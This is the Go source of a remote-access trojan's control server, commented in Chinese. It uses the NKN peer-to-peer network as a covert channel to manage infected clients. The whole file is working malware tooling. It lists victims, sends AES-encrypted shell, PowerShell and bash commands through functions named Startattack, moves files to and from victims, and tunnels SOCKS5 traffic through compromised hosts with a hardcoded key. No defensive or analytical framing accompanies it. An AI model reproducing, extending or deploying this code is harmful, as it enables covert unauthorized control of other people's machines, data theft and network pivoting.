//go:build windows || linux

package main

/*
NKN远控服务端主程序
功能：
1. 生成和验证seed
2. 监听客户端连接
3. 发送控制命令
4. 客户端别名管理(pp-1格式)
5. 日志分类存储
6. 帮助提示功能
*/

import (
	"Go-NKN-Trojan/Power"
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	nkn "github.com/nknorg/nkn-sdk-go"
)

// 客户端别名管理
var (
	clientAliasMap = make(map[string]string) // 客户端ID->别名映射
	aliasCount     = 1                       // 别名计数器
	aliasMutex     sync.Mutex
	currentClient  string // 当前选中的客户端
)

// 日志类型
const (
	LogTypeHeartbeat = "heartbeat"
	LogTypeError     = "error"
	LogTypeCommand   = "command"
)

func main() {
	/*
		主函数入口
		参数:
		-g new: 生成新seed
		-g [seed]: 使用指定seed启动监听
		命令:
		help: 显示帮助信息
		list: 显示客户端列表
	*/
	seed := flag.String("g", "", "生成新seed(-g new)或输入已有seed")
	flag.Parse()
	if *seed == "new" {
		//生成随机数种子
		account, err := nkn.NewAccount(nil)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(hex.EncodeToString(account.Seed()))
		os.Exit(0)
	} else if *seed == "" {
		fmt.Println("Please enter your private seed")
	} else if len(*seed) != 64 {
		fmt.Println("seed is illegal,need length is 64's seed")
	} else {
		go Startlisten(*seed)

		for {
			inputReader := bufio.NewReader(os.Stdin)
			inputext, err := inputReader.ReadString('\n')
			if err != nil {
				fmt.Println(err)
			}
			strarray := strings.Fields(strings.TrimSpace(inputext))
			if len(strarray) < 1 {
				continue
			}

			// 处理help命令
			if strarray[0] == "help" {
				showHelp()
				continue
			}

			// 处理list命令
			if strarray[0] == "list" {
				listClients()
				continue
			}

			// 处理use命令
			if strarray[0] == "use" {
				if len(strarray) < 2 {
					fmt.Println("Usage: use [client-alias]")
					continue
				}
				target := getClientID(strarray[1])
				if _, exists := clientAliasMap[target]; exists {
					currentClient = target
					fmt.Printf("已切换到客户端: %s\n", clientAliasMap[target])
				} else {
					fmt.Println("客户端不存在")
				}
				continue
			}

			// 如果已选择客户端且命令不以客户端ID开头
			if currentClient != "" && !strings.HasPrefix(strarray[0], "pp-") {
				// 在当前客户端上执行命令
				var command string
				for i := 0; i < len(strarray); i++ {
					command = command + strarray[i] + " "
				}
				go func() {
					reply, err := Startattack(currentClient, command)
					if err != nil {
						fmt.Printf("命令执行失败: %v\n", err)
					} else {
						// 解密返回结果
						decrypted, err := Power.AesCbcDecrypt([]byte(reply), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
						if err != nil {
							fmt.Printf("解密结果失败: %v\n", err)
						} else {
							fmt.Printf("命令执行结果: %s\n", string(decrypted))
						}
					}
				}()
				continue
			}

			if len(strarray) < 2 {
				continue
			}

			// 处理文件传输命令 (两种格式: [别名] upload [源文件] [目标文件] 或 upload [源文件] [目标文件])
			cmdIdx := 1
			target := currentClient
			if currentClient == "" || strings.HasPrefix(strarray[0], "pp-") {
				cmdIdx = 1
				target = getClientID(strarray[0])
			} else {
				cmdIdx = 0
			}

			if len(strarray) >= cmdIdx+3 && (strarray[cmdIdx] == "upload" || strarray[cmdIdx] == "download") {
				// 转换为文件传输协议命令
				if strarray[cmdIdx] == "upload" {
					meta, chunks, err := prepareFileUpload(strarray[2])
					if err != nil {
						fmt.Printf("准备上传文件失败: %v\n", err)
						continue
					}

					// 发送文件元信息
					metaCmd := fmt.Sprintf("filemeta %s %d %s %s",
						filepath.Base(strarray[cmdIdx+1]), meta.Size, meta.MD5, strarray[cmdIdx+2])
					go Startattack(target, metaCmd)

					// 分块发送文件内容
					for i, chunk := range chunks {
						chunkCmd := fmt.Sprintf("filechunk %d %x", i, chunk)
						go Startattack(target, chunkCmd)
					}

					// 发送完成指令
					go Startattack(target, "filedone")
				} else {
					// 下载文件
					go Startattack(target, fmt.Sprintf("filedownload %s %s", strarray[cmdIdx+1], strarray[cmdIdx+2]))
				}
			} else {
				// 普通命令
				var command string
				for i := 1; i < len(strarray); i++ {
					command = command + strarray[i] + " "
				}
				go Startattack(target, command)
			}
		}
	}
}

func Startlisten(seedid string) {
	/*
		启动NKN监听服务
		参数:
		seedid: NKN账户seed字符串
	*/
	err := func() error {
		seed, _ := hex.DecodeString(seedid)
		account, err := nkn.NewAccount(seed)
		if err != nil {
			return err
		}
		Listener, err := nkn.NewMultiClient(account, "monitor", 4, false, nknconfig)
		fmt.Println("your control id =", Listener.Address())
		if err != nil {
			return err
		}
		<-Listener.OnConnect.C
		for {
			msg := <-Listener.OnMessage.C
			aliasMutex.Lock()
			if _, exists := clientAliasMap[msg.Src]; !exists {
				alias := fmt.Sprintf("pp-%d", aliasCount)
				clientAliasMap[msg.Src] = alias
				aliasCount++
				connectMsg := fmt.Sprintf("新客户端连接: %s (别名: %s) IP信息: %s",
					msg.Src, alias, string(msg.Data))
				fmt.Println(connectMsg) // 控制台回显
				logToFile(LogTypeHeartbeat, connectMsg)
			} else {
				fmt.Printf("客户端 %s 已连接\n", clientAliasMap[msg.Src])
			}
			aliasMutex.Unlock()
			msg.Reply([]byte("OK"))
		}
	}()
	if err != nil {
		fmt.Println(err)
	}
}

// ProxyConnection 代理连接结构
type ProxyConnection struct {
	conn net.Conn
	port string
}

var proxyConnections = make(map[string]*ProxyConnection)
var proxyMutex sync.Mutex

func Startattack(goal string, command string) (string, error) {
	/*
		向目标客户端发送命令
		参数:
		goal: 目标客户端ID
		command: 要执行的命令
		特殊处理socks5代理命令
	*/
	if strings.HasPrefix(command, "socks5 ") {
		parts := strings.Fields(command)
		if len(parts) != 2 {
			fmt.Println("Usage: socks5 <port>")
			return "", fmt.Errorf("invalid socks5 command")
		}
		port := parts[1]
		go startLocalProxy(goal, port)
		return "SOCKS5代理已启动", nil
	}
	account, err := nkn.NewAccount(nil)
	if err != nil {
		log.Println(err)
	}
	// 创建带重试机制的NKN客户端
	var Hunter *nkn.MultiClient
	maxRetries := 3
	for i := 0; i < maxRetries; i++ {
		Hunter, err = nkn.NewMultiClient(account, RandomID(), 4, false, nknconfig)
		if err == nil {
			break
		}
		time.Sleep(time.Second * time.Duration(i+1))
	}
	if err != nil {
		return "", fmt.Errorf("创建客户端失败: %v", err)
	}
	defer Hunter.Close()

	// 等待连接建立或超时
	select {
	case <-Hunter.OnConnect.C:
	case <-time.After(10 * time.Second):
		return "", fmt.Errorf("连接超时")
	}
	encrycommand := AesEncode(command)
	onReply, err := Hunter.Send(nkn.NewStringArray(goal), encrycommand, nil)
	if err != nil {
		return "", fmt.Errorf("发送命令失败: %v", err)
	}

	// 等待响应或超时
	select {
	case reply := <-onReply.C:
		return string(reply.Data), nil
	case <-time.After(30 * time.Second):
		return "", fmt.Errorf("等待响应超时")
	}
}

func RandomID() string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 32; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	ctx := md5.New()
	ctx.Write(result)
	return hex.EncodeToString(ctx.Sum(nil))
}

func AesEncode(str string) []byte {
	encode, err := Power.AesCbcEncrypt([]byte(str), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
	if err != nil {
		fmt.Println(err)
	}
	return encode
}

var nknconfig *nkn.ClientConfig

// HandleFileTransfer 处理文件传输
func HandleFileTransfer(target, cmdType, srcPath, dstPath string) {
	/*
		处理文件上传/下载
		参数:
		target: 目标客户端ID
		cmdType: upload/download
		srcPath: 源文件路径
		dstPath: 目标路径
	*/
	if cmdType == "upload" {
		// 上传文件到客户端
		meta, chunks, err := prepareFileUpload(srcPath)
		if err != nil {
			log.Printf("准备上传文件失败: %v", err)
			return
		}

		// 发送文件元信息
		metaCmd := fmt.Sprintf("filemeta %s %d %s %s",
			filepath.Base(srcPath), meta.Size, meta.MD5, dstPath)
		Startattack(target, metaCmd)

		// 分块发送文件内容
		for i, chunk := range chunks {
			chunkCmd := fmt.Sprintf("filechunk %d %x", i, chunk)
			Startattack(target, chunkCmd)
		}

		// 发送完成指令
		Startattack(target, "filedone")
	} else if cmdType == "download" {
		// 从客户端下载文件
		Startattack(target, fmt.Sprintf("filedownload %s %s", srcPath, dstPath))
	}
}

// prepareFileUpload 准备文件上传
func prepareFileUpload(filePath string) (*Power.FileMeta, [][]byte, error) {
	// 获取文件信息
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		return nil, nil, err
	}

	// 计算MD5
	md5, err := Power.GetFileMD5(filePath)
	if err != nil {
		return nil, nil, err
	}

	// 分块读取文件
	chunks, err := Power.SplitFile(filePath)
	if err != nil {
		return nil, nil, err
	}

	meta := &Power.FileMeta{
		Name: filepath.Base(filePath),
		Size: fileInfo.Size(),
		MD5:  md5,
	}

	return meta, chunks, nil
}

// getClientID 获取客户端ID或别名对应的真实ID
func getClientID(input string) string {
	aliasMutex.Lock()
	defer aliasMutex.Unlock()

	// 检查是否是别名
	for id, alias := range clientAliasMap {
		if alias == input {
			return id
		}
	}
	return input
}

// listClients 列出所有已连接客户端
func listClients() {
	aliasMutex.Lock()
	defer aliasMutex.Unlock()

	if len(clientAliasMap) == 0 {
		fmt.Println("没有已连接的客户端")
		return
	}

	fmt.Println("已连接客户端:")
	for id, alias := range clientAliasMap {
		fmt.Printf("%s (ID: %s)\n", alias, id[:8]+"...")
	}
}

// logToFile 分类记录日志
func logToFile(logType, message string) {
	// 确保日志目录存在
	logDir := "logs"
	if _, err := os.Stat(logDir); os.IsNotExist(err) {
		os.Mkdir(logDir, 0755)
	}

	// 按日期和类型创建日志文件
	logFile := fmt.Sprintf("%s/%s-%s.log", logDir, logType, time.Now().Format("2006-01-02"))
	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println("无法打开日志文件:", err)
		return
	}
	defer f.Close()

	logEntry := fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
	if _, err := f.WriteString(logEntry); err != nil {
		log.Println("写入日志失败:", err)
	}
}

// showHelp 显示帮助信息
func showHelp() {
	fmt.Println(`
命令格式:
[别名/ID] [命令] [参数...]
或
use [别名/ID] 切换到指定客户端
[命令] [参数...] (切换后可直接输入命令)

可用命令:
help       - 显示帮助信息
list       - 显示客户端列表
use        - 切换到指定客户端
upload     - 上传文件到客户端 [本地路径] [远程路径]
download   - 从客户端下载文件 [远程路径] [本地路径]
socks5     - 启动SOCKS5代理 [端口]
cmd        - 执行系统命令 [命令]
powershell - 执行PowerShell命令 [命令]
bash       - 执行Bash命令 [命令]

示例:
pp-1 cmd ipconfig
pp-1 powershell Get-Process
pp-1 bash ifconfig
pp-2 upload local.txt /tmp/remote.txt  
pp-3 download /tmp/file.txt local.txt
pp-4 socks5 1080
`)
}

// startLocalProxy 启动本地代理端口
func startLocalProxy(clientID, port string) {
	// 监听本地端口
	listener, err := net.Listen("tcp", "127.0.0.1:"+port)
	if err != nil {
		logToFile(LogTypeError, fmt.Sprintf("代理端口监听失败: %v", err))
		return
	}
	defer listener.Close()

	logToFile(LogTypeHeartbeat, fmt.Sprintf("代理服务已启动, 本地端口: %s -> 客户端: %s", port, clientID))

	for {
		conn, err := listener.Accept()
		if err != nil {
			logToFile(LogTypeError, fmt.Sprintf("接受连接失败: %v", err))
			continue
		}

		proxyMutex.Lock()
		proxyConnections[conn.RemoteAddr().String()] = &ProxyConnection{
			conn: conn,
			port: port,
		}
		proxyMutex.Unlock()

		go handleProxyConnection(conn, clientID, port)
	}
}

// handleProxyConnection 处理代理连接
func handleProxyConnection(conn net.Conn, clientID, port string) {
	defer conn.Close()

	// 通过NKN发送数据
	account, err := nkn.NewAccount(nil)
	if err != nil {
		logToFile(LogTypeError, fmt.Sprintf("创建临时账户失败: %v", err))
		return
	}

	client, err := nkn.NewMultiClient(account, RandomID(), 4, false, nknconfig)
	if err != nil {
		logToFile(LogTypeError, fmt.Sprintf("创建客户端失败: %v", err))
		return
	}
	defer client.Close()

	<-client.OnConnect.C

	// 建立数据转发通道
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			break
		}

		data := map[string]interface{}{
			"type": "socks5",
			"port": port,
			"data": buf[:n],
		}
		jsonData, _ := json.Marshal(data)
		encrypted := AesEncode(string(jsonData))

		_, err = client.Send(nkn.NewStringArray(clientID), encrypted, nil)
		if err != nil {
			logToFile(LogTypeError, fmt.Sprintf("发送数据失败: %v", err))
			break
		}
	}
}

func init() {
	nknconfig = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              409600,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}
	// 配置日志输出到文件
	logFile, err := os.OpenFile("server.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
	}
}
